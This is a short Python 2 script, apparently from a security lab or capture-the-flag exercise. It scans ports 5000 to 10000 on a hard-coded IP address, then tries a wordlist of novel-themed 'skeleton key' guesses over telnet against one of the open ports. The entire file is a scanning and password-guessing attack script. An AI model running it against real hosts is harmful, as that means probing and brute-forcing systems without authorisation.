import socket
import errno
import requests
from requests.auth import HTTPBasicAuth

import getpass
import sys
import telnetlib

import time

IP_ADDRESS = '128.114.59.215'
URL = 'http://128.114.59.215:'
UNAME = 'ceneri'
PWRD = ''

openPorts = []

skeletonPossibilities = ['JeanPassepartout', 'Jean_Passepartout', 'Jean-Passepartout',
 'jeanpassepartout', 'jean_passepartout', 'jean-passepartout',
 'jeanPassepartout', 'jean_Passepartout', 'jean-Passepartout',
'jean', 'Jean', 'JEAN', 'passepartout', 'Passepartout', 'PASSEPARTOUT',
 'JEANPASSEPARTOUT', 'JEAN_PASSEPARTOUT', 'JEAN-PASSEPARTOUT',
 'JulesVern', 'Jules_Vern', 'Jules-Vern',
'julesvern', 'jules_vern', 'jules-vern',
 'julesVern', 'jules_Vern', 'jules-Vern',
'jules', 'Jules', 'JULES', 'Vern', 'vern', 'VERN',
 'JULESVERN', 'JULES_VERN', 'JULES-VERN', 'Aouda', 'AOUDA',
 'PhileasFogg', 'Phileas_Fogg', 'Phileas-Fogg',
 'phileasfogg', 'phileas_fogg', 'phileas-fogg',
 'phileasFogg', 'phileas_Fogg', 'phileas-Fogg',
'phileas', 'Phileas', 'PHILEAS', 'Fogg', 'fogg', 'FOGG',
 'PHILEASFOGG', 'PHILEAS_FOGG', 'PHILEAS-FOGG',
 'ReformClub', 'Reform_Club',  'Reform-Club'
 'reformclub', 'reform_club', 'reform-club',
 'reformClub', 'reform_Club', 'reform-Club',
'reform', 'Reform', 'REFORM', 'Club', 'CLUB', 'club',
 'REFORMCLUB', 'REFORM_CLUB', 'REFORM-CLUB',
 'GoesEverywhere', 'Goes_Everywhere', 'Goes-Everywhere',
 'goeseverywhere', 'goes_everywhere', 'goes-everywhere', 
 'goesEverywhere', 'goes_Everywhere', 'goes-Everywhere',
 'GOESEVERYWHERE', 'GOES_EVERYWHERE', 'GOES-EVERYWHERE',
'PASSPORT', 'passport', 'Passport'
]








for i in range(5000, 10001):

	try:
		clientsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		clientsocket.connect((IP_ADDRESS, i))
		isOpen = clientsocket.send('\n')
		#data = clientsocket.recv(1024)

		if isOpen == 1: 
			openPorts.append(i)
			print "port", i

	except socket.error, v:
		errorcode = v[0]
		#if errorcode == errno.ECONNREFUSED:
			#print "Conecction refused"

print "Total number of sockets is", len(openPorts)
print openPorts

#for sKey in possible:
#https://docs.python.org/2.4/lib/telnet-example.html

def get_skeleton_key():

	for sKey in skeletonPossibilities:

		#sKey = 'passepartout'
		#sKey = 'passepatout'

		HOST = IP_ADDRESS
		#user = raw_input("Enter your remote account: ")
		#password = getpass.getpass()

		tn = telnetlib.Telnet(HOST, str(openPorts[5]))


		#tn.write("GET /" + sKey + " HTTP/1.0")
		print sKey

		try: 
			tn.write(sKey + "\n")
			#print "GET /" + sKey + " HTTP/1.0"
			#print tn.read_all()

			tn.read_until("Username: ")
			tn.write(UNAME + "\n")
			print tn.read_all()

			return sKey

		except EOFError, v:
			print "no"

lol = get_skeleton_key()

print "skeleton muthafucka", lol